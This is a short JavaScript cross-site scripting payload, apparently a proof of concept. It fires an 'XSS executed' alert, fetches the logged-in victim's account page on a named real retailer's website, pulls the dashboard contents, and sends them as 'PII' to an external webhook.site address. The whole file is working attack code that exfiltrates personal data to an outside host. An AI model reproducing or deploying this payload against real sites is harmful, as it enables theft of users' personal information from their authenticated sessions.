(async function(){
  try {

    alert('XSS executed');

    const resp1 = await fetch('https://www.guerlain.com/fr/fr-fr/account');
    const page = await resp1.text();
    
    const doc = new DOMParser().parseFromString(page, 'text/html');
    const element = doc.querySelector('.dashboard-content.container');
    const dataToSend = element ? element.textContent.trim() : null;

    await fetch('https://webhook.site/ad236dff-c493-471b-8a45-aa8989d8ad60/guerlin-PII', {
      method: 'POST',
      mode: 'no-cors',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ PII: dataToSend })
    });
  } catch (err) {
    console.error('Erreur détectée :', err);
  }
})();
